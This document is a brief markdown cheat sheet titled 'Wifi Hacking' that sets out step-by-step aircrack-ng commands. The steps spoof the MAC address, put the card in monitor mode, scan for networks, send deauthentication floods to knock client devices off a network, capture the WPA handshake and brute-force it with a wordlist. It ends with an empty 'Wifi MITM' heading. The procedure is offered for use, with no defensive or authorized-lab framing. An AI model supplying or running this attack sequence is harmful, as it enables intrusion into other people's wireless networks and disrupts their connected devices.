# Wifi Hacking

1. Change wlan mac address  
   `ifconfig wlan0 down` - down wifi card  
   `macchanger -r wlan0` - change mac address for wlan0  
   `iwconfig` - check mode (must be monitor mode)
   `airmon-ng check kill` - if any process use wlan0 they will be kill
   `iwconfig wlan0 mode monitor` - change to monitor mode  
   `airmon-ng start wlan0` - change to monitor mode (alternative to iwconfig)

2.  `airodump-ng wlan0` - check SSID around pc  ( only checks 2.4 GHz band so if you want to see also 5 GHz band, add `-band abg`)  
   If you see many 'not associated' in BSSID column maybe any problem with NetworkManager so restart it and check again SSID
   Get BSSID and CH info for next step

 3.  `airodump-ng -c <CH> --bssid <BSSID> wlan0` - check connections device (stations) to wifi
 
 4.  `aireplay-ng -0 10 -a <BSSID> -c <STATION> wlan0` - DOS attach to any STATION device drop from  BSSID (wifi) (this is for catch handshake) (`-0` == `--deauth`, `10` is packet number)

 5.  `airodump-ng -c <CH> --bssid <BSSID> wlan0 -w <wpahash_file_name>` - Listen wifi device to catch handshake

 6.  `aircrack-ng -w <wordlist_file> <wpahash_file>` - brute-force to wpahash


## Wifi MITM


